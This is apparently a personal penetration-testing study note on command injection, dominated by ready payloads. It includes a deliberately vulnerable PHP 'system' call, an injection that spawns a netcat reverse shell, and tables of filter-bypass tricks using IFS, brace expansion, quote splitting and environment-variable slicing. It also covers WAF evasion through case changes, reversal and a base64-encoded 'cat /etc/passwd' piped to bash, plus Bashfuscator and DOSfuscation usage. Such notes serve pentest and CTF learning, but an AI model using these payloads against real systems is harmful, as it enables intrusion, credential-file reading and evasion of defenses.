---
title: Command Injections
created: 2025-07-15
modified: 2025-07-15
tags: ["CMD"]
---
## What is Command Injections?

Command Injections occurs when a threat actor can execute malicious code in the server by injecting special characters to break the existing command and from there they will inject their malicious command which performs a malicious action. An fantastic example of this occurring is the following code.

```php title="Vulnerable PHP Code"
<?php
system("echo " . $_POST["invoice_id"] . " > invoice_id.txt")
?>
```

```shell title="Command Injection Example"
/?invoice_id=1337;%20nc%20127.0.0.1%208443%20-e%20/bin/sh
```

The PHP code shown above is vulnerable for command injection because it enables a threat actor to inject special character (`;`) to break the existing command and from there inject a malicious command which return a reverse shell. This could be prevented if the user inputs were sanitized before being included into the `system` function.

## Command Injection Methods

In the previous section the semicolon (`;`) character were used to break the existing command that the system will be executing on the system. However, there are many more special characters which enables us to break the existing command to inject our malicious command.

| Name            | Ofuscation                | Description                                                                                                                 |
| --------------- | ------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| TABS            | `127.0.0.1%0a%09whoami`   | <li><code>%0a</code> = New line</li><li><code>%09</code> = Tabs</li>                                                        |
| IFS             | `127.0.0.1%0a{IFS}whoami` | <li><code>%0a</code> = New line</li><li><code>{IFS}</code> = Space character in Linux</li>                                  |
| Brace Expansion | `127.0.0.1%0a{ls,-la}`    | <li><code>%0a</code> = New line</li><li><code>{ls,-la}</code> = Listing all files and folders inside current directory</li> |

It's always worth trying to use all these methods shown above to obtain command injection because all web applications handles the requests differently. The [PayloadOfAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#filter-bypasses) has many more methods for obtaining command injection.

## Bypassing Blacklisted Characters

In some web applications there are sanitization implemented which prevents characters such as `/`, `:`, `ls`, `whoami`, and so forth... In these circumstances it's possible to bypass these filters by using environment variables in Windows and Linux systems.

```shell title="Bypassing Blacklisted Character In Linux"
# Display all data inside of $PATH variable
echo $PATH

# Using a specific character from the $PATH variable
echo ${PATH:<START>:<END>}

# Using that character on our command injections
${PATH:0:1}${IFS} 

# Crafting malicious command injection input
${LS_COLORS:10:1}${IFS}%0a{ls,-la}
```

```shell title="Bypassing Blacklisted Character In Windows"
# Bypassing Blacklisted Charaters on CMD
%HOMEPATH:~1,11%

# Bypassing Blacklisted Characters on PowerShell
$env:HOMEPATH[0]

# Bypassing Blacklisted Characters on 
$env:PROGRAMFILES[10]
```

A great example of using environment variable is when the string `ls` is blacklisted it's possible to bypass the security mechanism in the web application by combining the environment  `${LS_COLORS:14:1}${LS_COLORS:1:1}` which becomes `ls`.

## Character Shifting

Character Shifting is another method which enables us to bypass the filtering mechanism in the web applications by shifting the character which is not blacklisted to a blacklisted character. A great example of this is the following commands.

```shell title="Character Shifting"
# Displaying all the ASCII characters
man ascii

# This will allow us to use the `[` character
echo $(tr '!-}' '"-~'<<<[)
```

This is another great method for bypassing the filtering mechanism in a web application. I personally have never tried character shifting method before but it's a method which is good to know that it exists.

## Bypassing Blacklisted Commands

In some circumstances the web applications blacklists specific strings such as `ls`, `whoami`, `dir`, `env` and so forth to prevent command injections. In these circumstances it's possible to bypass these security filters using the following methods.

| Name                      | Obfuscation | Description                                                                                  |
| ------------------------- | ----------- | -------------------------------------------------------------------------------------------- |
| Qoutes                    | `w'h'o'm'i` | <li>Supported on Linux</li><li>Bypasses the filter because of <code>`</code> character.</li> |
| Double Qoutes             | `w"h"o"m"i` | <li>Supported on Linux</li><li>Bypasses the filter because of `"` character.</li>            |
| Double Special Characters | `who$@ami`  | <li>Supported on Linux</li><li>Bypassing the filter with `$@'` special characters.</li>      |
| Dashes                    | `w\ho\am\i` | <li>Supported on Linux</li><li>Bypassing the filter with dash characters.</li>               |
| Caret                     | `who^ami`   | <li>Supported on Windows</li><li>Bypasses the filter because <code>^</code> character</li>   |

Here's a quick overview of crafting a command injection payload using [[#Command Injection Methods]], [[#Bypassing Blacklisted Characters]], and the [[#Bypassing Blacklisted Commands]] *(current section)*.

```shell title="Bypassing Web Application Sanitization "
127.0.0.1${LS_COLORS:10:1}${IFS}%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

As mentioned previously it's always worth trying all these different methods taught through the different sections to bypass the security mechanism in the web application. 

## Advanced Obfuscation

Nowadays most web applications are protected with Web Application Firewalls (WAF) which detects Command Injections, SQL Injections, and Cross-Site Scripting and from there it blocks our request from being processed by the web application. In these circumstances it's worth trying the following methods to bypass WAF.

**Windows Operating Systems**

| Technique | Obfuscation                                                                                               | Description                                                                                                       |
| --------- | --------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| Case      | `WhOaMi`                                                                                                  | <li>Supported on PowerShell Only</li><li>PowerShell is not case-sensitive</li>                                    |
| Reverse   | <li><code>"whoami"[-1..-20] -join ''</code></li><li><code>iex "$('imaohw'[-1..-20] -join '')"</code></li> | <li>Supported on PowerShell Only <li>Revering the command to bypass WAF</li>                                      |

**Linux Operating Systems**

| Technique | Obfuscation                                                                                                                                          | Description                                                                                       |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
| Case      | `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`<br>                                                                                                               | <li>Supported on Linux</li><li>Converts <code>WhOaMi</code> to lowercase <code>whoami</code></li> |
| Reverse   | <li><code>echo 'whoami' \| rev</code</li><li><code>$(rev<<<'imaohw')</code></li>                                                                     | <li>Supported on Linux</li><li>Reversing the command to bypass WAF</li>                           |
| Encoded   | <li><code>echo -n 'cat /etc/passwd \| grep 33' \| base64</code></li><li><code>bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code></li> | <li>Supported on Linux</li><li>Base64 encoded string will be decoded in the back-end server</li>  |

It's fairly difficult to bypass Web Application Firewalls (WAF) since it requires us to do multiple of trials and errors before we are able to find a payload that is suitable and can be allowed through WAF.

## Command Injection Evasion Tools

Majority of advanced security tools already detects all the possible command injections that we are capable of coming up with therefore it's worth trying to generate obfuscated commands on Linux and Windows using [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)  and [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) .

**Bashfuscator**

```shell title="Bashfuscator"
# Setting up bashfuscator
git clone https://github.com/Bashfuscator/Bashfuscator
python3 setup.py install --user
python3 -m pip install pyperclip
python3 -m pip install argcomplete
pip install -e .

# Generating a random command to read /etc/passwd file
./bashfuscator -c 'cat /etc/passwd'

# Generating a custom command to read /etc/passwd file
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

**DOSfunscation**

```powershell title="DOSfuscation"
# Importing DOSfunscation
Import-Module 'Invoke-DOSfuscation.psd1'

# Encoding command
SET command type "C:\Users\<USER>\Desktop\flag.txt"
encoding
```

The likelihood of all these commands already being detected by the security provider is high because the security provider can block all these commands. If none of these methods are works than the only option we have is to manually bypass WAF.

